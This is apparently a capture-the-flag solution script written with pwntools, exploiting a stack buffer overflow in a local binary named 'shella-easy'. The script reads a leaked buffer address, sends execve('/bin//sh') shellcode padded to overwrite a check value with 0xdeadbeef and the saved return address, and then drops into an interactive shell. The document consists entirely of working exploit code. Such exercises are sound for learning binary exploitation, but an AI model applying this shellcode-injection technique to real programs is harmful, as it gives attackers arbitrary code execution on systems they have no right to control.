from pwn import *

target = process('./shella-easy')
# gdb = attach(target, gdbscript = 'b *main+102')

# wait until the program gives it's buffer location
print(target.recvuntil('Yeah I\'ll have a '))
leak_addr = target.recvline()
input_addr = int(leak_addr.decode()[:10], 16)

# first put the shell code from http://shell-storm.org/shellcode/files/shellcode-827.php
payload =  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload += bytes([0] * (64 - len(payload)))
payload += p32(0xdeadbeef)
payload += bytes([0] * (76 - len(payload)))
payload += p32(input_addr)

target.sendline(payload)
target.interactive()